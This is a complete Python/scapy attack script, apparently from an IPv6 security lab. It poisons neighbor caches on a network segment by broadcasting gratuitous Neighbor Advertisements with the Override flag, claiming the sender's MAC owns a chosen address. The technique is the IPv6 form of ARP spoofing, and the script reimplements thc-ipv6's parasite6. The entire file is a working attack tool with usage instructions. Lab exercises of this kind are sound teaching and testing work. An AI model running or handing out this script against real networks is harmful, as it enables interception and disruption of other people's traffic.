#!/usr/bin/env python3
"""02-ndp-spoof.py -- poison neighbor caches on the segment with a gratuitous NA.

Broadcasts an unsolicited Neighbor Advertisement (Override flag set)
claiming our own MAC owns --spoof-addr - the direct functional
equivalent of ARP spoofing. See deep-dive.md's Neighbor Discovery and
Attack Lab sections. From-scratch version of thc-ipv6's parasite6.

Usage (run inside the attacker namespace):
    sudo ip netns exec v6lab-attacker python3 02-ndp-spoof.py \\
        --iface veth-attacker --spoof-addr fd00:6:cafe::1
"""

import argparse
from scapy.all import Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, get_if_hwaddr, sendp


def eui64_link_local(mac_str):
    b = [int(x, 16) for x in mac_str.split(":")]
    b[0] ^= 0x02
    iid = b[0:3] + [0xff, 0xfe] + b[3:6]
    return "fe80::" + ":".join(f"{iid[i]:02x}{iid[i + 1]:02x}" for i in range(0, 8, 2))


parser = argparse.ArgumentParser(description="Poison neighbor caches with a gratuitous NA")
parser.add_argument("--iface", required=True)
parser.add_argument("--spoof-addr", required=True, help="the address we're claiming to own")
parser.add_argument("--count", type=int, default=3, help="how many times to repeat (default 3)")
parser.add_argument("--interval", type=float, default=2.0, help="seconds between repeats (default 2)")
args = parser.parse_args()

src_mac = get_if_hwaddr(args.iface)
src_ip = eui64_link_local(src_mac)

pkt = (
    Ether(src=src_mac, dst="33:33:00:00:00:01")
    / IPv6(src=src_ip, dst="ff02::1")
    / ICMPv6ND_NA(tgt=args.spoof_addr, R=0, S=0, O=1)  # O=1: override any existing cache entry
    / ICMPv6NDOptDstLLAddr(lladdr=src_mac)
)

print(f"broadcasting ownership of {args.spoof_addr} -> {src_mac} on {args.iface}")
sendp(pkt, iface=args.iface, count=args.count, inter=args.interval, verbose=False)
print("done. on the victim: ip -6 neigh show")
